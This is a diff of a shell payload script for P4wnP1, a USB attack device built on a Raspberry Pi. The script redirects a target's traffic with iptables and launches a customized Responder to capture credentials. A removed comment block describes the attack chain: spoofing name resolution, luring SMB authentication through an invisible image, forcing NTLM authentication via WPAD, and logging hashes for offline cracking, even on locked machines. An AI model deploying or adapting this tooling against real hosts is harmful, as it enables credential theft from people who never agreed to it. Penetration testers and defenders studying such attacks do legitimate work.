@@ -16,34 +16,12 @@ function onNetworkUp()
         iptables -t nat -A PREROUTING -i $active_interface -p udp -m addrtype ! --dst-type MULTICAST,BROADCAST,LOCAL -j REDIRECT
 
 	#start responder in screen
-        # Example setup
-        # -----------------
-        #
-        # The customized Responder (https://github.com/mame82/Responder, branch: EMULATE_INTERNET_AND_WPAD_ANYWAY) 
-        # runs the following setup:
-        #       1) DNS, LLMNR and NBT-NS enabled: As all packets arrive here, every possible hostname resolves to 172.16.0.1
-        #       no matter which name resolution technique is used by the target. This could be tested from the target by running:
-        #               $ ping <somerandomhostname>
-        #       2) Fingerprinting (OS discovery is enabled)
-        #       3) HTTP requests to any IP / hostname / domainname are redirected to Responder and served with a custom
-        #       HTML page (/home/pi/Responder/filles/AccessDenied.html). This file contains an invisible image referencing
-        #       a SMB share at \\spoofsmb\.
-        #       4) SMB requests (including the one to SPOOFSMB) are redirected to Responder and the client is forced to 
-        #       authenticate to a random challenge. NTLM hash of the user gets logged along with the provided challenge for offline
-        #       cracking in /home/pi/Responder/logs and /home/pi/Responder/Responder.db
-        #       5) Requests to wpad.dat are answered with a forced NTLM authentication (customized Responder needed to do this
-        #       while serving HTTP files). Such an request is issued everytime the host connects, because the WPAD server is
-        #       provided via DHCP. Windows Domain Clients without MS16-112 patch send the NTLM hash, even if the screen is locked.
-        #       This is basically the attack presented by Mubix.
-        #       6) Connectivity tests of Windows 7 and Windows 10 clients are answered correctly, thus the OS believes an Internet
-        #       connection is present on the interface (customized Responder needed to do this)
-        #       7) All other responder servers IMAP/POP3/FTP ... are running, too
-        #       8) Responder runs in a screen session, thus the output could be attached to a SSH session on the Pi:
-        #               $ ssh pi@172.16.0.1
-        #               $ sudo screen -d -r
         screen -dmS responder bash -c "cd $wdir/Responder/; python Responder.py -I $active_interface -f -v -w -F"
 
 	touch /tmp/responder_started
+
+	# print Network is running via Keyboard to host
+	echo "Network is running" | outhid
 }
 
 function onTargetGotIP()
@@ -57,7 +35,6 @@ function onTargetGotIP()
 	# add DNS entry for google DNS
 	echo nameserver 8.8.8.8 > /etc/resolv.conf
 
-	echo "On TargetGotIP finished"
 }
 
 function onBootFinished()
@@ -65,10 +42,8 @@ function onBootFinished()
 	# we should land here even if no RNDIS / CDC ECM is enabled
 	# as long as P4wnP1 gets connected to a target host
 
-
-	# print out "Hello World" via HID keyboard"
-	cd $wdir
-	python press.py
+	# print "Boot finished" via HID keyboard (languag layoute selected in setup.cfg)
+	echo "Boot finished" | outhid
 }
 
 # commands in this function are ran on user login
